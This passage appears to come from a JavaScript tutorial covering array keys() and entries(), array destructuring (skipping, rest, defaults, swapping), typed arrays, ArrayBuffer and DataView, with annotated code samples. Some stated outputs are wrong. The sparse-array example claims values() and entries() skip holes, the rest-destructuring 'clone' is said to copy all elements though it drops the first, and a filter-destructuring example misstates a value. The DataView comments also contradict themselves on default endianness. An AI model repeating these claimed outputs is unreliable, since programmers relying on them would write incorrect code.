for (let [index, value] of arr.entries()) {
  console.log(`${index}: ${value}`);
  // 0: x, 1: y, 2: z
}

// Sparse arrays - keys includes holes
let sparse = [1, , 3];
[...sparse.keys()]          // [0, 1, 2] - all indices
[...sparse.values()]        // [1, 3] - only values, holes skipped
[...sparse.entries()]       // [[0, 1], [2, 3]] - entries without holes

// Converting to array
let arr = [10, 20, 30];
let keyArray = Array.from(arr.keys());
keyArray                    // [0, 1, 2]

// Finding max index
let arr = [10, 5, 20, 15];
let maxIndex = [...arr.entries()]
  .reduce((max, [i, v]) => v > arr[max] ? i : max);
maxIndex                    // 2 (index of 20)

// Filtering indices
let arr = ['a', 'b', 'c', 'd'];
let evenIndices = [...arr.keys()].filter(i => i % 2 === 0);
evenIndices                 // [0, 2]

// Most use cases are better served by alternatives
// Use for...of with entries() instead of for loop with indices

// âœ— Traditional
for (let i = 0; i < arr.length; i++) {
  console.log(i, arr[i]);
}

// âœ“ Better - using entries()
for (let [i, val] of arr.entries()) {
  console.log(i, val);
}

// Or even simpler
arr.forEach((val, i) => {
  console.log(i, val);
});
```
## 7.5 Array Destructuring

**Array destructuring** allows extracting values from arrays and assigning them to variables in a concise syntax. It's a powerful ES6 feature that makes code more readable and reduces boilerplate.

---

### 7.5.1 Basic Destructuring

**Basic destructuring** extracts array elements by position and assigns them to variables.

```javascript
// Basic destructuring
let arr = [1, 2, 3];
let [a, b, c] = arr;
a                           // 1
b                           // 2
c                           // 3

// Partial destructuring
let [first, second] = arr;
first                       // 1
second                      // 2
// Third element ignored

// Extra variables
let arr = [1, 2];
let [a, b, c] = arr;
c                           // undefined

// Nested arrays
let nested = [1, [2, 3], 4];
let [a, [b, c], d] = nested;
a                           // 1
b                           // 2
c                           // 3
d                           // 4

// Destructuring strings (strings are iterable)
let str = 'ABC';
let [a, b, c] = str;
a                           // 'A'
b                           // 'B'
c                           // 'C'

// Multiple levels of nesting
let data = [1, [2, [3, 4]]];
let [a, [b, [c, d]]] = data;
c                           // 3
d                           // 4

// Ignoring elements
let arr = [1, 2, 3, 4, 5];
let [first, , third] = arr;
first                       // 1
third                       // 3
// Skips second element

// Destructuring from function return
function getCoordinates() {
  return [10, 20];
}

let [x, y] = getCoordinates();
x                           // 10
y                           // 20

// Simple swap
let a = 1, b = 2;
[a, b] = [b, a];
a                           // 2
b                           // 1

// Unpacking function arguments
function processArray([a, b, c]) {
  return a + b + c;
}

processArray([1, 2, 3]);    // 6

// Extracting from complex nested structure
let response = {
  data: [100, 200, 300],
  status: 'success'
};

let [first, second] = response.data;
first                       // 100
second                      // 200
```

---

### 7.5.2 Skipping Elements

**Skipping elements** allows ignoring specific positions while destructuring.

```javascript
// Skip one element
let arr = ['a', 'b', 'c', 'd'];
let [first, , third] = arr;
first                       // 'a'
third                       // 'c'
// 'b' is skipped

// Skip multiple elements
let [a, , , d] = arr;
a                           // 'a'
d                           // 'd'

// Skip at end
let [first, second] = ['a', 'b', 'c', 'd'];
first                       // 'a'
second                      // 'b'
// Elements after are ignored

// Skip in nested structure
let nested = [1, [2, 3, 4], 5];
let [a, [, b, ], c] = nested;
a                           // 1
b                           // 3 (skips 2)
c                           // 5

// Common pattern: get first and last
let arr = [1, 2, 3, 4, 5];
let [first, , , , last] = arr;
first                       // 1
last                        // 5

// Or use rest (better)
let [first, ...middle, last] = arr;
// Error! Rest must be last element

// Better approach
let [first, ...rest] = arr;
let last = rest[rest.length - 1];
last                        // 5

// Skipping with different values
let arr = [10, 20, 30, 40, 50];
let [, a, , b, ] = arr;
a                           // 20
b                           // 40

// Function parameters - skip unused
function processValues([, , importantValue]) {
  return importantValue * 2;
}

processValues([1, 2, 3]);   // 6 (uses only third value)

// Skip with rest parameter
let [first, , ...rest] = [1, 2, 3, 4, 5];
first                       // 1
rest                        // [3, 4, 5]
```

---

### 7.5.3 Rest in Destructuring

**Rest in destructuring** (using `...`) collects remaining elements into a new array.

```javascript
// Collect remaining elements
let arr = [1, 2, 3, 4, 5];
let [first, ...rest] = arr;
first                       // 1
rest                        // [2, 3, 4, 5]

// Two elements, rest of array
let [a, b, ...others] = [10, 20, 30, 40, 50];
a                           // 10
b                           // 20
others                      // [30, 40, 50]

// Only rest
let [...all] = arr;
all                         // [1, 2, 3, 4, 5]
// Equivalent to [...arr]

// Skip and rest
let [, , ...tail] = [1, 2, 3, 4, 5];
tail                        // [3, 4, 5]

// Rest in nested structure
let [first, [second, ...inner], ...outer] = [1, [2, 3, 4], 5, 6];
first                       // 1
second                      // 2
inner                       // [3, 4]
outer                       // [5, 6]

// Common pattern: separate first and rest
function processItems([first, ...rest]) {
  console.log('First:', first);
  console.log('Rest:', rest);
}

processItems([1, 2, 3, 4]);
// First: 1
// Rest: [2, 3, 4]

// Head and tail
let [head, ...tail] = [1, 2, 3, 4, 5];
head                        // 1
tail                        // [2, 3, 4, 5]

// Last element using rest (workaround)
let arr = [1, 2, 3, 4, 5];
let [...all] = arr;
let last = all[all.length - 1];
// But simpler: arr[arr.length - 1]

// Rest captures empty array
let [first, ...rest] = [1];
first                       // 1
rest                        // []

// Rest is always an array
let [first, ...rest] = [1];
Array.isArray(rest);        // true

// Cannot use rest in middle
let [a, ...middle, b] = [1, 2, 3, 4];
// SyntaxError: rest element must be last element

// Function that takes first param and collects rest
function sum(first, ...rest) {
  return first + rest.reduce((a, b) => a + b, 0);
}

sum(1, 2, 3, 4);            // 10

// Destructuring with rest in function
function printEntries([first, ...rest]) {
  console.log('First entry:', first);
  rest.forEach(entry => console.log('Entry:', entry));
}

// Cloning with spread vs destructuring
let original = [1, 2, 3];
let clone1 = [...original];         // Using spread
let [, ...clone2] = original;       // Using rest destructuring
// Both create new array: [1, 2, 3]

// Prefer spread for clarity
```

---

### 7.5.4 Default Values

**Default values** are assigned when destructured element is `undefined`.

```javascript
// Simple default
let [a = 1, b = 2] = [5];
a                           // 5 (uses destructured value)
b                           // 2 (uses default)

// Multiple defaults
let [x = 10, y = 20, z = 30] = [1];
x                           // 1
y                           // 20
z                           // 30

// Default expressions
let arr = [1];
let [a = 10 * 2, b = 20 + 5] = arr;
a                           // 1
b                           // 25 (20 + 5)

// Defaults with null vs undefined
let [a = 10] = [null];
a                           // null (null is not undefined)

let [b = 10] = [undefined];
b                           // 10 (undefined triggers default)

// Defaults in nested destructuring
let [a, [b = 20, c = 30] = []] = [1];
a                           // 1
b                           // 20
c                           // 30

// Default using function
function getDefaultUser() {
  return { id: 999, name: 'Anonymous' };
}

let [user = getDefaultUser()] = [];
user                        // { id: 999, name: 'Anonymous' }
// Function only called if value is undefined

// Using previous element in default
let [a = 1, b = a * 2] = [5];
a                           // 5
b                           // 10 (uses a)

// Chained defaults
let [a = 1, b = a + 1, c = b + 1] = [];
a                           // 1
b                           // 2 (1 + 1)
c                           // 3 (2 + 1)

// Complex default value
let [data = { id: 0, values: [] }] = [];
data                        // { id: 0, values: [] }

// Skipping with defaults
let [, , c = 3] = [1, 2];
c                           // 3

// Function parameter defaults
function process([a = 10, b = 20] = []) {
  return a + b;
}

process();                  // 30 (uses all defaults)
process([5]);               // 25 (a=5, b=20)
process([5, 15]);           // 20 (a=5, b=15)

// Empty array gets all defaults
let [a = 1, b = 2] = [];
a                           // 1
b                           // 2

// Mixed with skipping
let [a = 10, , c = 30] = [1, 2];
a                           // 1
c                           // 30
// Second element skipped regardless of default
```

---

### 7.5.5 Swapping Variables

**Swapping variables** is one of the most elegant uses of destructuring.

```javascript
// Simple swap
let a = 1, b = 2;
[a, b] = [b, a];
a                           // 2
b                           // 1

// Swap three variables
let x = 'a', y = 'b', z = 'c';
[x, y, z] = [z, x, y];
x                           // 'c'
y                           // 'a'
z                           // 'b'

// Swap array elements
let arr = [1, 2, 3];
[arr[0], arr[2]] = [arr[2], arr[0]];
arr                         // [3, 2, 1]

// Before ES6 (required temp variable)
let a = 1, b = 2;
let temp = a;
a = b;
b = temp;
// Now: a=2, b=1 (more code!)

// Rotate values
let a = 1, b = 2, c = 3;
[a, b, c] = [b, c, a];
a                           // 2
b                           // 3
c                           // 1

// Swap with array methods
let arr = [1, 2, 3, 4, 5];
// Swap first and last
[arr[0], arr[arr.length - 1]] = [arr[arr.length - 1], arr[0]];
arr                         // [5, 2, 3, 4, 1]

// Swap adjacent elements
function swapAdjacent(arr, i) {
  [arr[i], arr[i + 1]] = [arr[i + 1], arr[i]];
}

let arr = [1, 2, 3, 4];
swapAdjacent(arr, 1);
arr                         // [1, 3, 2, 4]

// Practical: sorting by swapping
let arr = [3, 1, 2];
for (let i = 0; i < arr.length; i++) {
  for (let j = i + 1; j < arr.length; j++) {
    if (arr[i] > arr[j]) {
      [arr[i], arr[j]] = [arr[j], arr[i]];
    }
  }
}
arr                         // [1, 2, 3]

// Without destructuring (bubble sort)
arr = [3, 1, 2];
for (let i = 0; i < arr.length - 1; i++) {
  for (let j = 0; j < arr.length - i - 1; j++) {
    if (arr[j] > arr[j + 1]) {
      let temp = arr[j];
      arr[j] = arr[j + 1];
      arr[j + 1] = temp;
    }
  }
}
// Much more verbose!

// Swap with computed indices
let data = { values: [10, 20, 30] };
let i = 0, j = 2;
[data.values[i], data.values[j]] = [data.values[j], data.values[i]];
data.values                 // [30, 20, 10]

// Multiple swaps in one line
let a = 1, b = 2, c = 3;
[a, b, c] = [c, b, a];
a                           // 3
b                           // 2
c                           // 1

// Swap doesn't require temp variable anymore
let x = 'hello';
let y = 'world';
[x, y] = [y, x];
x                           // 'world'
y                           // 'hello'
```

---

### 7.5.6 Advanced Destructuring Patterns

**Advanced patterns** combine multiple features for powerful array manipulation.

```javascript
// Destructuring with filtering
let arr = [1, 2, 3, 4, 5];
// Get only even numbers into separate variables
let [a, , b, , c] = arr.filter(x => x % 2 === 0);
a                           // 2
b                           // 4
c                           // undefined (not enough even numbers)

// Conditional destructuring
let data = true ? [1, 2] : [3, 4];
let [a, b] = data;
a                           // 1
b                           // 2

// Destructuring function output
function divmod(dividend, divisor) {
  return [Math.floor(dividend / divisor), dividend % divisor];
}

let [quotient, remainder] = divmod(17, 5);
quotient                    // 3
remainder                   // 2

// Combining with spread operator
let arr = [1, 2, 3, 4, 5];
let [first, second, ...rest] = arr;
first                       // 1
second                      // 2
rest                        // [3, 4, 5]

// Ignoring and spreading
let [a, , ...others] = [1, 2, 3, 4, 5];
a                           // 1
others                      // [3, 4, 5]

// Deep destructuring with defaults
let data = [
  [1, 2],
  [3, 4, 5]
];

let [[a = 0, b = 0], [c = 0, d = 0, e = 0]] = data;
a                           // 1
b                           // 2
c                           // 3
d                           // 4
e                           // 5

// With missing arrays
let [[x = 10, y = 20] = [], [z = 30]] = [];
x                           // 10
y                           // 20
z                           // 30

// Function parameters with multiple destructuring
function process([first, ...rest], [a, b]) {
  return {
    first,
    rest,
    a,
    b
  };
}

process([1, 2, 3], [10, 20]);
// { first: 1, rest: [2, 3], a: 10, b: 20 }

// Combining array and object destructuring
let [x, { y, z }] = [1, { y: 2, z: 3 }];
x                           // 1
y                           // 2
z                           // 3

// Error handling with destructuring
function fetchData() {
  return [null, 'Data loaded'];  // [error, data]
}

let [error, data] = fetchData();
if (!error) {
  console.log(data);        // 'Data loaded'
}

// Destructuring in loops
let matrix = [[1, 2], [3, 4], [5, 6]];
for (let [a, b] of matrix) {
  console.log(a, b);
  // 1, 2
  // 3, 4
  // 5, 6
}

// Transforming during destructuring (with computed property)
let arr = [1, 2, 3];
let [a, b, c] = arr.map(x => x * 2);
a                           // 2
b                           // 4
c                           // 6

// Destructuring with array methods
let [min, max] = (() => {
  let arr = [5, 2, 9, 1];
  return [Math.min(...arr), Math.max(...arr)];
})();
min                         // 1
max                         // 9

// Complex pattern matching
let result = {
  success: true,
  values: [10, 20, 30]
};

let { success, values: [first, second, ...rest] } = result;
success                     // true
first                       // 10
second                      // 20
rest                        // [30]

// Null coalescing with destructuring
let [a = 'default'] = [null];
a                           // null (null is not undefined!)

let [b = 'default'] = [undefined];
b                           // 'default'

// Empty vs undefined
let [] = [];                // Valid
let [] = [1, 2, 3];        // Valid, elements ignored
```

**Best Practices:**

```javascript
// âœ“ Use destructuring for clarity
let [x, y] = [1, 2];

// âœ“ Use rest for variable-length arrays
let [first, ...rest] = arr;

// âœ“ Use defaults for optional values
let [a = 10, b = 20] = arr;

// âœ“ Use for function parameters
function process([a, b]) {
  return a + b;
}

// âœ— Don't over-nest (hard to read)
let [a, [b, [c, [d]]]] = data;  // Difficult to follow

// âœ“ Extract to variables first
let [[x, y]] = data;
let result = x + y;

// âœ“ Use for swapping
[a, b] = [b, a];

// âœ— Avoid ambiguous skipping
let [, , , x] = arr;  // Hard to count positions

// âœ“ Be explicit with comments
let [
  firstName,  // Person's first name
  lastName,   // Person's last name
  , // Age skipped
  email       // Email address
] = data;
```
## 7.6 Typed Arrays

**Typed Arrays** provide a mechanism to access raw binary data with fixed data types. They're essential for performance-critical code, binary protocol handling, and low-level data manipulation.

---

### 7.6.1 Typed Array Types and Creation

**Typed Arrays** come in various types for different integer and floating-point sizes.

```javascript
// Integer typed arrays (signed)
let int8 = new Int8Array(4);          // -128 to 127
let int16 = new Int16Array(4);        // -32,768 to 32,767
let int32 = new Int32Array(4);        // -2^31 to 2^31-1

// Unsigned integer typed arrays
let uint8 = new Uint8Array(4);        // 0 to 255
let uint16 = new Uint16Array(4);      // 0 to 65,535
let uint32 = new Uint32Array(4);      // 0 to 2^32-1

// Floating-point typed arrays
let float32 = new Float32Array(4);    // 32-bit float
let float64 = new Float64Array(4);    // 64-bit double

// Big integer typed arrays (ES2020)
let bigInt64 = new BigInt64Array(4);   // -2^63 to 2^63-1
let bigUint64 = new BigUint64Array(4); // 0 to 2^64-1

// Initialization with values
let arr = new Uint8Array([1, 2, 3, 4]);
arr                         // Uint8Array [1, 2, 3, 4]

// From regular array
let regular = [10, 20, 30];
let typed = new Uint8Array(regular);
typed                       // Uint8Array [10, 20, 30]

// From another typed array
let source = new Uint8Array([1, 2, 3]);
let copy = new Uint16Array(source);
copy                        // Uint16Array [1, 2, 3]

// From ArrayBuffer
let buffer = new ArrayBuffer(16);     // 16 bytes
let view = new Uint8Array(buffer);
view.length                 // 16

// With offset and length
let buffer = new ArrayBuffer(16);
let view1 = new Uint8Array(buffer, 0, 4);    // First 4 bytes
let view2 = new Uint8Array(buffer, 4, 4);    // Next 4 bytes
// Different views of same buffer

// Zero-filled array
let arr = new Uint8Array(5);
arr                         // Uint8Array [0, 0, 0, 0, 0]

// Fixed length (cannot change)
let arr = new Uint8Array(5);
arr.push(10);               // TypeError: push is not a function
arr.length = 10;            // Silently ignored

// Type coercion
let arr = new Uint8Array([1.9, 2.5, 3.1]);
arr                         // Uint8Array [1, 2, 3] - truncated!

// Overflow
let arr = new Uint8Array([260]);  // 260 = 0x104
arr                         // Uint8Array [4] - wraps around (260 & 0xFF = 4)

// Negative values (unsigned)
let arr = new Uint8Array([-1, -2, -3]);
arr                         // Uint8Array [255, 254, 253] - wrapped
```

**Key Properties:**

```javascript
// BYTES_PER_ELEMENT
Uint8Array.BYTES_PER_ELEMENT;       // 1
Uint16Array.BYTES_PER_ELEMENT;      // 2
Uint32Array.BYTES_PER_ELEMENT;      // 4
Float32Array.BYTES_PER_ELEMENT;     // 4
Float64Array.BYTES_PER_ELEMENT;     // 8

// Instance properties
let arr = new Uint8Array(10);
arr.byteLength;             // 10 (bytes)
arr.byteOffset;             // 0 (offset in buffer)
arr.buffer;                 // ArrayBuffer

// Length in elements
arr.length;                 // 10 (elements, not bytes)

// For Uint32Array with 4 elements
let arr = new Uint32Array(4);
arr.length;                 // 4 (elements)
arr.byteLength;             // 16 (bytes: 4 * 4)
Uint32Array.BYTES_PER_ELEMENT;  // 4 (bytes per element)
```

---

### 7.6.2 Typed Array Operations

**Operations** on typed arrays include indexing, modification, and copying.

```javascript
// Reading elements
let arr = new Uint8Array([10, 20, 30, 40]);
arr[0];                     // 10
arr[2];                     // 30
arr[10];                    // undefined (out of bounds)

// Writing elements
arr[0] = 99;
arr[0];                     // 99

// Assignment with type conversion
arr[1] = 256;               // Wraps to 0 (256 & 0xFF)
arr[1];                     // 0

// Float truncation
let floats = new Float32Array(2);
floats[0] = 3.14159;
floats[0];                  // 3.1415901660919189 (precision loss)

// Iteration methods (same as regular arrays)
let arr = new Uint8Array([1, 2, 3, 4, 5]);

// forEach
arr.forEach((x, i) => {
  console.log(`${i}: ${x}`);
});

// map
let doubled = arr.map(x => x * 2);  // Returns new typed array

// filter
let evens = arr.filter(x => x % 2 === 0);

// reduce
let sum = arr.reduce((a, b) => a + b, 0);  // 15

// find
let found = arr.find(x => x > 3);   // 4

// some / every
arr.some(x => x > 4);       // true
arr.every(x => x > 0);      // true

// Copying elements
let src = new Uint8Array([1, 2, 3, 4]);
let dst = new Uint8Array(4);

// set() method
dst.set(src);               // [1, 2, 3, 4]

// With offset
let dst2 = new Uint8Array(6);
dst2.set(src, 2);           // [0, 0, 1, 2, 3, 4]

// Subarray (view, not copy)
let arr = new Uint8Array([1, 2, 3, 4, 5]);
let sub = arr.subarray(1, 4);  // [2, 3, 4]

// Modification through subarray affects original
sub[0] = 99;
arr[1];                     // 99 (same buffer!)

// slice (true copy)
let copy = arr.slice(1, 4);  // [2, 3, 4]
copy[0] = 99;
arr[1];                     // Not affected (different buffer)

// indexOf / lastIndexOf
let arr = new Uint8Array([1, 2, 3, 2, 1]);
arr.indexOf(2);             // 1
arr.lastIndexOf(2);         // 3

// includes
arr.includes(3);            // true

// reverse
arr.reverse();              // [1, 2, 3, 2, 1] -> [1, 2, 3, 2, 1]

// sort
let unsorted = new Uint8Array([3, 1, 4, 1, 5]);
unsorted.sort();            // [1, 1, 3, 4, 5]

// With comparator
unsorted.sort((a, b) => b - a);  // [5, 4, 3, 1, 1]

// copyWithin
let arr = new Uint8Array([1, 2, 3, 4, 5]);
arr.copyWithin(0, 3);       // [4, 5, 3, 4, 5]

// fill
arr.fill(0);                // [0, 0, 0, 0, 0]
arr.fill(7, 1, 3);          // [0, 7, 7, 0, 0]

// toLocaleString / toString
let arr = new Uint8Array([1, 2, 3]);
arr.toString();             // '1,2,3'
arr.toLocaleString();       // '1,2,3'
```

---

### 7.6.3 Converting Between Typed Arrays

**Conversion** allows switching between typed array types and regular arrays.

```javascript
// Uint8Array to regular array
let typed = new Uint8Array([1, 2, 3]);
let regular = Array.from(typed);
regular                     // [1, 2, 3]

// Using spread
let regular = [...typed];   // [1, 2, 3]

// Using slice
let regular = Array.prototype.slice.call(typed);

// Regular array to typed array
let regular = [1, 2, 3];
let typed = new Uint8Array(regular);
typed                       // Uint8Array [1, 2, 3]

// Between typed array types
let uint8 = new Uint8Array([1, 2, 3]);
let uint16 = new Uint16Array(uint8);
uint16                      // Uint16Array [1, 2, 3]

// With precision loss
let float32 = new Float32Array([3.14159, 2.71828]);
let uint8 = new Uint8Array(float32);
uint8                       // Uint8Array [3, 2] - truncated

// Type conversion
let uint8 = new Uint8Array([256, 257, 258]);
let int16 = new Int16Array(uint8.buffer);
// Reinterprets bytes as 16-bit signed integers

// Endianness matters
let bytes = new Uint8Array([0x12, 0x34]);
let int16 = new Int16Array(bytes.buffer);
// Little-endian: 0x3412 = 13330
// Big-endian: 0x1234 = 4660

// Safe conversion with Array.from
let mixed = [1, 2, 300, -1, 3.14];
let uint8 = Uint8Array.from(mixed, x => x & 0xFF);  // [1, 2, 44, 255, 3]

// Or with mapping
let uint8 = new Uint8Array(mixed.map(x => Math.min(255, Math.max(0, x))));

// Copy to shared buffer
let buffer = new ArrayBuffer(8);
let uint32_1 = new Uint32Array(buffer, 0, 1);
let uint32_2 = new Uint32Array(buffer, 4, 1);
uint32_1[0] = 0x12345678;
uint32_2[0] = 0x9ABCDEF0;
// buffer now contains both values

// Reading as different type
let buffer = new ArrayBuffer(4);
let uint32 = new Uint32Array(buffer);
let uint8 = new Uint8Array(buffer);
uint32[0] = 0x12345678;
uint8[0];                   // 0x78 (little-endian)
uint8[1];                   // 0x56
uint8[2];                   // 0x34
uint8[3];                   // 0x12

// Float to bytes
let buffer = new ArrayBuffer(4);
let floats = new Float32Array(buffer);
let bytes = new Uint8Array(buffer);
floats[0] = 3.14159;
bytes;                      // Uint8Array [208, 15, 73, 64] (bytes representation)
```

---

### 7.6.4 Uint8ClampedArray

**Uint8ClampedArray** is special: values are clamped to 0-255 range instead of wrapping.

```javascript
// Regular Uint8Array (wraps)
let uint8 = new Uint8Array([256, 257, -1]);
uint8                       // [0, 1, 255]

// Uint8ClampedArray (clamps)
let clamped = new Uint8ClampedArray([256, 257, -1]);
clamped                     // [255, 255, 0]  // 256->255, 257->255, -1->0

// Float values are rounded
let clamped = new Uint8ClampedArray([255.5, 0.5, -0.5]);
clamped                     // [255, 0, 0]  // Rounded to nearest int

// Used for image data
let imageData = {
  width: 2,
  height: 2,
  data: new Uint8ClampedArray([
    255, 0, 0, 255,        // Red pixel (RGBA)
    0, 255, 0, 255,        // Green pixel
    0, 0, 255, 255,        // Blue pixel
    255, 255, 255, 255     // White pixel
  ])
};

// Canvas pixel manipulation
let canvas = document.createElement('canvas');
let ctx = canvas.getContext('2d');
let imgData = ctx.createImageData(100, 100);

// Modify pixels with clamping (ensures valid RGB values)
imgData.data[0] = 256;      // Clamped to 255
```

---

### 7.6.5 BigInt64Array and BigUint64Array (ES2020)

**BigInt typed arrays** handle 64-bit integers beyond JavaScript's safe integer range.

```javascript
// BigInt64Array for signed 64-bit integers
let big64 = new BigInt64Array(4);
big64[0] = 123n;
big64[0];                   // 123n

big64[1] = -456n;
big64[1];                   // -456n

// BigUint64Array for unsigned 64-bit integers
let bigUint64 = new BigUint64Array(4);
bigUint64[0] = 9007199254740991n;  // Beyond safe integer
bigUint64[0];               // 9007199254740991n

// Very large numbers
let maxInt64 = 9223372036854775807n;
let big64 = new BigInt64Array([maxInt64]);
big64[0];                   // 9223372036854775807n

// Operations
let big64 = new BigInt64Array([10n, 20n, 30n]);
big64[0] = big64[0] + 5n;
big64[0];                   // 15n

// Cannot mix regular and BigInt
let big64 = new BigInt64Array(1);
big64[0] = 10;              // TypeError: Cannot convert 10 to a BigInt

// Regular integers must convert
big64[0] = BigInt(10);      // OK

// Iteration
let big64 = new BigInt64Array([1n, 2n, 3n]);
big64.forEach(x => console.log(x));  // 1n, 2n, 3n

// Converting BigInt array to regular array
let big64 = new BigInt64Array([10n, 20n, 30n]);
let regular = Array.from(big64);
regular                     // [10n, 20n, 30n]

// Using spread
let regular = [...big64];   // [10n, 20n, 30n]
```

---

### 7.6.6 ArrayBuffer and Binary Data

**ArrayBuffer** represents generic fixed-length binary data. Views interpret the bytes.

```javascript
// Create buffer
let buffer = new ArrayBuffer(16);   // 16 bytes
buffer.byteLength;          // 16

// Create views
let uint8View = new Uint8Array(buffer);
let uint32View = new Uint32Array(buffer);

// Different views of same data
uint8View[0] = 0x12;
uint8View[1] = 0x34;
uint8View[2] = 0x56;
uint8View[3] = 0x78;
uint32View[0];              // Depends on endianness
                            // Little-endian: 0x78563412
                            // Big-endian: 0x12345678

// Slicing buffer (creates new buffer)
let buffer = new ArrayBuffer(16);
let slice = buffer.slice(4, 8);  // Bytes 4-7
slice.byteLength;           // 4

// View with offset
let buffer = new ArrayBuffer(16);
let view1 = new Uint8Array(buffer, 0, 4);    // First 4 bytes
let view2 = new Uint8Array(buffer, 8, 4);    // Next 4 bytes at offset 8

// Detached buffer (after transfer)
let buffer = new ArrayBuffer(16);
let transferred = buffer.transfer?.();  // Not standard yet

// Creating buffer from binary string
function stringToBuffer(str) {
  let buffer = new ArrayBuffer(str.length);
  let view = new Uint8Array(buffer);
  for (let i = 0; i < str.length; i++) {
    view[i] = str.charCodeAt(i);
  }
  return buffer;
}

let buffer = stringToBuffer('Hello');

// Reading back
function bufferToString(buffer) {
  let view = new Uint8Array(buffer);
  let str = '';
  for (let i = 0; i < view.length; i++) {
    str += String.fromCharCode(view[i]);
  }
  return str;
}

bufferToString(buffer);     // 'Hello'

// Use case: Network packet
let packetBuffer = new ArrayBuffer(20);  // 20-byte packet
let header = new Uint32Array(packetBuffer, 0, 1);
let payload = new Uint8Array(packetBuffer, 4, 16);
header[0] = 0xDEADBEEF;  // Set packet identifier
```

---

### 7.6.7 DataView for Mixed-Type Data

**DataView** allows reading/writing different types from same buffer with explicit endianness control.

```javascript
// Create DataView
let buffer = new ArrayBuffer(16);
let view = new DataView(buffer);

// Writing different types
view.setUint8(0, 0xFF);          // 8-bit unsigned at offset 0
view.setInt16(2, -1000);         // 16-bit signed at offset 2
view.setFloat32(4, 3.14);        // 32-bit float at offset 4
view.setUint32(8, 0xDEADBEEF);   // 32-bit unsigned at offset 8

// Reading back
view.getUint8(0);                // 255
view.getInt16(2);                // -1000
view.getFloat32(4);              // 3.140000104904175
view.getUint32(8);               // 3735928559

// Endianness control
let buffer = new ArrayBuffer(4);
let view = new DataView(buffer);

// Little-endian (default false)
view.setUint32(0, 0x12345678, true);  // true = little-endian
view.getUint8(0);                      // 0x78

// Big-endian (false)
view.setUint32(0, 0x12345678, false); // false = big-endian
view.getUint8(0);                      // 0x12

// Writing bytes directly
let bytes = [0x48, 0x65, 0x6C, 0x6C, 0x6F];  // "Hello"
let buffer = new ArrayBuffer(5);
let view = new DataView(buffer);
bytes.forEach((b, i) => view.setUint8(i, b));

// Or using Uint8Array
let buffer = new ArrayBuffer(5);
new Uint8Array(buffer).set(bytes);

// Complex structures
// Binary format: 1 byte flag, 2 bytes length, N bytes data
function packData(flag, data) {
  let buffer = new ArrayBuffer(3 + data.length);
  let view = new DataView(buffer);
  let uint8 = new Uint8Array(buffer);
  
  view.setUint8(0, flag);
  view.setUint16(1, data.length);  // Offset 1, uses system endianness
  for (let i = 0; i < data.length; i++) {
    uint8[3 + i] = data[i];
  }
  
  return buffer;
}

function unpackData(buffer) {
  let view = new DataView(buffer);
  let uint8 = new Uint8Array(buffer);
  
  let flag = view.getUint8(0);
  let length = view.getUint16(1);
  let data = [];
  for (let i = 0; i < length; i++) {
    data.push(uint8[3 + i]);
  }
  
  return { flag, data };
}

let packed = packData(1, [65, 66, 67]);  // A, B, C
let unpacked = unpackData(packed);
unpacked                    // { flag: 1, data: [65, 66, 67] }

// Reading strings from binary
let buffer = new ArrayBuffer(5);
let uint8 = new Uint8Array(buffer);
uint8.set([0x48, 0x65, 0x6C, 0x6C, 0x6F]);  // "Hello"

let str = String.fromCharCode(...uint8);
str                         // "Hello"

// Offset parameter
let buffer = new ArrayBuffer(20);
let view = new DataView(buffer, 5, 10);  // 10 bytes starting at offset 5
view.byteLength;            // 10
view.byteOffset;            // 5
```

---

### 7.6.8 Use Cases

**Common use cases** for typed arrays and binary data.

```javascript
// Image processing with canvas
function processImageData(imageData) {
  let data = imageData.data;  // Uint8ClampedArray
  
  // Grayscale conversion
  for (let i = 0; i < data.length; i += 4) {
    let r = data[i];
    let g = data[i + 1];
    let b = data[i + 2];
    let gray = (r + g + b) / 3;
    
    data[i] = gray;
    data[i + 1] = gray;
    data[i + 2] = gray;
    // data[i + 3] is alpha, keep unchanged
  }
}

// Audio processing
let audioBuffer = new Float32Array(48000);  // 1 second at 48kHz
audioBuffer[0] = 0.5;  // Set first sample

// Applying gain
for (let i = 0; i < audioBuffer.length; i++) {
  audioBuffer[i] *= 0.5;  // Reduce volume by half
}

// Network protocol parsing
function parseHTTPHeader(buffer) {
  let view = new Uint8Array(buffer);
  let headerEnd = -1;
  
  // Find \r\n\r\n (0x0D, 0x0A, 0x0D, 0x0A)
  for (let i = 0; i < view.length - 3; i++) {
    if (view[i] === 0x0D && view[i+1] === 0x0A &&
        view[i+2] === 0x0D && view[i+3] === 0x0A) {
      headerEnd = i;
      break;
    }
  }
  
  if (headerEnd === -1) return null;
  
  // Convert to string
  let headerBytes = view.subarray(0, headerEnd);
  let header = String.fromCharCode(...headerBytes);
  return header;
}

// File format parsing (PNG header)
function isPNG(buffer) {
  let view = new Uint8Array(buffer);
  // PNG signature: 137 80 78 71 13 10 26 10
  return view[0] === 137 && view[1] === 80 &&
         view[2] === 78 && view[3] === 71 &&
         view[4] === 13 && view[5] === 10 &&
         view[6] === 26 && view[7] === 10;
}

// Compression (simple example)
function compress(data) {
  let uint8 = new Uint8Array(data);
  let result = [];
  
  for (let i = 0; i < uint8.length; i++) {
    let count = 1;
    while (i + count < uint8.length &&
           uint8[i] === uint8[i + count] &&
           count < 255) {
      count++;
    }
    result.push(count);
    result.push(uint8[i]);
    i += count - 1;
  }
  
  return new Uint8Array(result);
}

// Cryptography (mock example)
function simpleXOR(buffer, key) {
  let view = new Uint8Array(buffer);
  for (let i = 0; i < view.length; i++) {
    view[i] ^= key[i % key.length];
  }
  return view;
}

let encrypted = simpleXOR(new Uint8Array([1, 2, 3]), [5, 5, 5]);
encrypted                   // Uint8Array [4, 7, 6]

// WebGL vertex data
let positions = new Float32Array([
  -1, -1,  // Vertex 1 (x, y)
   1, -1,  // Vertex 2
   0,  1   // Vertex 3
]);

// Math optimizations
function dot(a, b) {
  let result = 0;
  for (let i = 0; i < a.length; i++) {
    result += a[i] * b[i];
  }
  return result;
}

let vec1 = new Float32Array([1, 2, 3]);
let vec2 = new Float32Array([4, 5, 6]);
dot(vec1, vec2);            // 32 (1*4 + 2*5 + 3*6)

// Shared memory (Web Workers)
let shared = new SharedArrayBuffer(16);
let view = new Int32Array(shared);
view[0] = 42;  // Can be accessed from multiple workers
```

**Performance Characteristics:**

```javascript
// Typed arrays are more memory-efficient
let regular = [1, 2, 3, 4, 5];  // Each number is object overhead
let typed = new Uint8Array(regular);  // Compact storage

// Typed arrays are faster for numerical operations
let regular = [];
let typed = new Float32Array(1000);

// Filling arrays
console.time('Regular');
for (let i = 0; i < 1000; i++) {
  regular[i] = Math.random();
}
console.timeEnd('Regular');

